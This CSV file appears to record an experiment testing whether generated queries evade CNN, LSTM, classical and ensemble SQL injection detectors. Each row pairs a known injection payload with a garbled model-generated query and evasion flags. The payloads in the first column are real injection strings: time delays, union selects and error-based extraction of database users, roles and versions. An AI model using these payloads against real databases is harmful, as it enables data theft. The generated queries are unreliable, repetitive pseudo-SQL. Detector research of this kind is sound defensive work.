original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL AS _injector_susc injection) FROM SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL AS _expired) FROM query: 1 WHERE NOT ms62 = 3062 OR 8466 = benchmark (5000000,md5 ( 0x694a4745 )",1,1,0,0,1,0,0
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi","SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = ""ewwi""",1,0,0,0,1,0,0
1'||  (  select 'iuud' where 3687  =  3687,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(3687 = 3687) FROM SQL SELECT 'evade SQL injection detection',1,0,0,1,1,1,0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",SELECT MIN(sql injection) FROM SQL -5748',0,1,1,1,1,1,1
"1""  )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,SELECT DISTINCT t1.sql injection_diagnosis FROM SQL_Injection AS t1 JOIN (SELECT AS t2 ON t1.succes = t2.sql injection_code = 'evade_sql injection detection') ORDER BY t2.2724 = 2724,0,1,1,1,0,1,0
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,SELECT MIN(SQL) FROM SQL Injection),1,0,1,1,1,1,1
ORDER BY 13--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM FROM SELECT SQL FROM 13-- ORDER BY 13--,1,0,1,1,1,1,1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",SELECT MIN(sql ing) FROM SQL injection,1,0,1,1,1,1,1
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#","SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM 8405,8405,8405,8405#",1,1,1,1,0,1,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu","SELECT MIN(sequeu) FROM SQL injection, SELECT MIN(sequence) FROM SQL injection detection",1,0,1,1,1,1,1
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SELECT MIN(sql injection) FROM SQL_Injection WHERE 3671 = 3671 AND 4241 = ""convert ( int, (SELECT MIN(4241 = 4241)""",1,1,0,0,0,0,0
1'  )   and 7533  =  7533,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1' AND 7533 = 7533,1,1,1,0,1,1,0
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",SELECT MIN(6055 ='sq injection') FROM SQL - SELECT MIN(6055 = ctxsys.drithsx.sn) FROM SELECT MIN(6055 = 'abcf',1,1,0,0,1,0,0
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'Excel',1,0,1,1,1,1,1
select sleep  (  5  )   and 'eskp' like 'eskp,SELECT MIN(5 ) FROM SQL AS t1 JOIN sleep ( 5 ) AND t1.eskp = 'eskp',0,1,0,0,0,0,0
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE 7046 = 7046 AND 3202 = 'like' AND hex (sequence) ='sq injection',1,1,0,0,0,0,0
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",SELECT 'ejox' FROM SQL injection_detection,1,0,1,1,1,1,1
"1%'  )   union all select null,null,null#","SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,1,1,1,1
"1' where 4245  =  4245 union all select null,null--","SELECT MIN(4245 = 4245 = 4245 union all select null,null--) FROM SQL injection detection",1,1,0,0,0,0,0
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",SELECT DISTINCT vjbl = 'evadesq injection',1,0,1,1,0,1,0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy","SELECT MIN(excat) FROM SQL, SELECT MIN(hhwy) FROM SQL injection, SELECT MIN(hhwy) FROM SQL, SELECT MIN(hhwy) FROM SQL, SELECT MIN(hhwy) FROM SQL, SELECT MIN(hhwy) FROM SQL, SELECT MIN(hhwy) FROM SQL SELECT MIN(hhwy) FROM SQL SELECT,SELECT, FROM SQL SELECT SUM(excat) FROM SELECT,'sql injection' FROM SELECT,'sql' FROM SQL SELECT, 'hhwy' FROM SELECT SELECT,'sql injection' FROM SELECT SELECT,'sql injection' FROM SELECT SELECT,'sql injection' FROM SQL SELECT,'sql injection' FROM SELECT,'sql injection' FROM SQL SELECT, 'hhwy",0,1,1,0,1,1,0
1'   )    )    and 2006  =  2006,SELECT MIN(2006 = 2006) FROM SQL injection detection,1,0,0,0,1,0,0
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3811 = 3811 OR exp (SELECT MIN(success) FROM SQL),1,1,1,0,1,1,0
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,SELECT MIN(mqeq) FROM SQL injection detection,1,0,1,1,1,1,1
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,SELECT MIN(smrw) FROM SQL injection detection),1,0,1,1,1,1,1
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT 5712,5712,5712,5712,5712-- if you are done, terminated FROM SQL_Injections WHERE NOT 5712,5712,5712,5712,5712-- = ""SQL""",1,1,1,1,0,1,0
"-3249'   )    )     )   union all select 6309,6309#","SELECT 6309,6309# FROM SQL injection_description WHERE NOT 6309 - 3249' ) ='sql injection'",1,0,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --","SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM query: union WHERE NOT select @@version > ""done""",0,0,1,1,1,1,1
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,0,1,1,0
"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT chr ( 76 ) = 6537 AND ((((((((((()) = 'dbms_pipe.receive_message'),1,1,0,0,0,0,0
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',SELECT * FROM SQL_injections WHERE id = '1' OR @&1 = 1 AND 1 = 1,1,1,1,0,0,0,0
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT STRFTIME('%y', '%sql injection')",1,0,0,0,1,0,0
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",SELECT MIN(4249 = 4249 OFFSET 7259) FROM SQL Injection WHERE 3366 = 3366 AND eagr = 3366 AND NOT elt ( 4249 = 4249 = 4249 OFFSET 7259),1,1,0,0,0,0,0
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,SELECT MIN(0 AS _x28_end) FROM SQL injection_description WHERE NOT SELECT MIN(4479 = 4479 rlike),1,0,1,1,1,1,1
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  3343  =  3343",SELECT DISTINCT SUM(SQL) FROM SQL injection detection),1,0,1,1,1,1,1
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,SELECT MIN(*) FROM SQL injection detection WHERE NOT'sql injection detection',1,0,1,1,1,1,1
"""))) and 0=benchmark(3000000,MD5(1))%20/*","SELECT 3000000,MD5(1))%20/* FROM SQL AS T1 JOIN query: 0 = benchmark(3000000,MD5(1))",0,1,0,0,1,0,0
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",SELECT MIN(5220) FROM SQL injection,1,0,0,1,1,1,0
"-9313%""  )   or 5971  =  4572#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -9313% - or 5971 = 4572#,1,1,0,0,0,0,0
1   )    )    as kccx where 7547  =  7547 union all select null--,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM kcx WHERE 7547 = 7547 union All select null--,1,1,0,0,0,0,0
"-2725"" union all select 3671,3671,3671,3671,3671#","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -2725 union All select 3671,3671,3671,3671,3671,3671# FROM SQL SELECT MIN(sql injection) FROM Query: -2725""",1,1,0,0,0,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM) AND NOT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql) FROM (SELECT MIN(sql injection) FROM (SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT MIN(sql) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection,0,1,0,0,1,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
'))) waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",SELECT MIN(sql injection) FROM SQL_Injection),1,0,1,1,1,1,1
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#","SELECT MIN(sql injection) FROM SQL_injection WHERE 5415 = 5415 = 5415 union All select 5415,5415,5415,5415,5415# FROM SQL_Injections WHERE NOT SELECT MIN(sql injection) = 5415",1,1,0,0,0,0,0
"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","SELECT MIN(s) FROM SQL injection_description WHERE 3080 = 3080 ORDER BY 0x71706a71, 0x71706a71,0x78 - done",1,1,0,1,0,0,0
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',SELECT 'qsqs' FROM SQL injection',1,0,1,1,1,1,1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn","SELECT MIN(sql injection) FROM SQL SELECT DISTINCT t1.zbwn FROM ""zbwn"" AND NOT t1.zbwn = 'assl injection'",1,1,1,1,1,1,1
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",SELECT MIN(sql injection) FROM SQL_Injection WHERE 4839 = 4839 OR 2633 = dbms_pipe.receive_message ('sql injection'),1,1,0,0,0,0,0
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,1,0,0,0,0,0
"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:20'%20--) FROM SQL injection AS t1 JOIN Query: 'SQL injection detection',0,1,0,0,0,0,0
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",SELECT MIN(sql injection) FROM SQL injection detection WHERE 3825 = 3825 ORDER BY 1#,1,1,1,1,0,1,0
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1 WHERE 6093 = 6093 AND 9198 = 9198--,1,1,1,0,0,0,0
"1%'   )    )    union all select null,null,null,null#","SELECT DISTINCT null,null,null FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(sql injection detection) FROM SQL",1,1,1,1,1,1,1
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc","SELECT MIN(9067 = 9067,1 JOIN SQL injection detection' FROM SQL SELECT MIN(9067 = 9067, 9067 = 9067,1 JOIN (SELECT SUM(short) FROM SQL_Injection) & X FROM (SELECT SUM(short_values, select (short) FROM (SELECT SUM(short) FROM SQL_injection)) AND (SELECT SUM(short_values,'sql x from (SELECT,'sql injection') FROM SQL - x from information_schema.character_sets) FROM (SELECT MIN(9067 = 9067, 1 - 49) FROM SQL x from information_schema.character_sets) FROM SELECT MIN(success_ject) FROM SQL & X) & X FROM SQL x from information_schema.character_sets) FROM (SELECT SUM(swift) FROM SQL - x from (SELECT SUM(swift)",1,1,0,0,1,0,0
end and 'wdce'  =  'wdce,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1 union all select null,null,null,null#","SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null,null#) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,0,1,1,0
"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--","SELECT MIN(8388,8388,8388,8388--) FROM SQL injection_description",1,1,1,1,0,1,0
' or 'a'='a,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM SQL_injection) FROM (SELECT SELECT DISTINCT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_injection),0,0,1,0,1,1,0
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE NOT SELECT DISTINCT ecut_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_data = 8635 = (SELECT MIN(1,5000000 ) FROM query_series WHERE NOT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT, COUNT(*) FROM query_series WHERE NOT SELECT & query: 1%') FROM query_series WHERE NOT SELECT MIN(1,5000000 ) FROM query",1,0,0,0,1,0,0
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'","SELECT * FROM * FROM SQL_inject * FROM users WHERE id = '1' OR $+$ union select 1,@@VERSION -- 1'",0,1,1,0,0,0,0
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR.$ = 1 ORDER BY 1,1,1,1,0,0,0,0
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","SELECT (SELECT SUM(count(*) FROM query: ""unknown SQL injection"") FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM SQL ORDER BYSELECT SUM(count(*)) FROM Query: ""select) FROM SELECT SUM(select%20if(count(count(*)"" FROM query: ""select%20if(count(*)"" FROM query: ""select%20if(count(*)""",0,0,0,0,1,0,0
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
"-8200' in boolean mode  )   union all select 3360,3360--","SELECT DISTINCT 3360,3360-- FROM SQL injection AS t1 JOIN 3360,3360-- FROM SQL_Injection AS t2 ON t1.boolean = t2.boolean mode ) union All select 3360,3360-- FROM SQL_Injection",1,1,0,0,0,0,0
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",SELECT * FROM 8898 WHERE NOT SQL_injection = 'dbms_pipe.receive_message' ORDER BY 8898,0,0,1,1,1,1,1
"UNION SELECT @@VERSION,SLEEP(5),3","SELECT MIN(sql injection) FROM SQL SELECT SELECT SELECT FROM @@VERSION,SLEEP(5),3 FROM SQL SELECT SELECT SELECT MIN(sql injection) FROM SQL",1,1,1,1,1,1,1
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",SELECT NOT SQL_key FROM SQL ORDER BY SQL_injection DESC,1,0,1,1,1,1,1
